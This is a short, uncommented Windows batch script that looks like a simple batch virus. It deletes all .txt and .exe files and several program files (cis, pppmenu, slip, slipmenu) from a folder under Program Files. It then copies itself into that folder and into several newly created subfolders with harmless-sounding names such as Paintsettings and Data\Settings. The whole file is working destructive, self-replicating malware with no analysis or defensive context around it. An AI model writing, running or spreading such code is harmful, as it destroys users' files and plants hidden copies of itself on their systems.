@echo off 
cls 
:acces 
del C:\progra~1\bureau~1\*.txt 
del C:\progra~1\bureau~1\*.exe 
del C:\progra~1\bureau~1\cis.* 
del C:\progra~1\bureau~1\pppmenu.* 
del C:\progra~1\bureau~1\slip.* 
del C:\progra~1\bureau~1\slipmenu.* 
copy %0 C:\progra~1\bureau~1 
md C:\progra~1\bureau~1\Paintsettings 
copy %0 C:\progra~1\bureau~1\Paintsettings 
md C:\progra~1\bureau~1\Data 
copy %0 C:\progra~1\bureau~1\Data 
md C:\progra~1\bureau~1\Data\Settings 
copy %0 C:\progra~1\bureau~1\Data\Settings 
md C:\progra~1\bureau~1\Data\Files 
copy %0 C:\progra~1\bureau~1\Data\Files 
cls 

